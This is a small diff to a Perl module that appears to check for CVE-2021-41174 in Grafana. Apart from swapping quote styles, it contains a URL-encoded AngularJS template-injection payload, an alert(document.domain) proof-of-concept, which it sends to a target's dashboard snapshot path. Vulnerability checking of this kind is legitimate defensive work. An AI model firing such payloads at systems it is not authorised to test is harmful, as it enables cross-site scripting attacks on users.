@@ -9,8 +9,8 @@ package Spellbook::Advisory::CVE_2021_41174 {
 
         Getopt::Long::GetOptionsFromArray (
             $parameters,
-            "h|help"     => \$help,
-            "t|target=s" => \$target
+            'h|help'     => \$help,
+            't|target=s' => \$target
         );
 
         if ($target) {
@@ -19,7 +19,7 @@ package Spellbook::Advisory::CVE_2021_41174 {
             }
 
             my $useragent = Spellbook::Core::UserAgent -> new();
-            $snapshot_path = "dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1";
+            $snapshot_path = 'dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1';
             my $request = $useragent -> get ("$target/$snapshot_path");
 
             if (($request -> code() == 200) && ($request -> content() =~ /Grafana/ms)) {
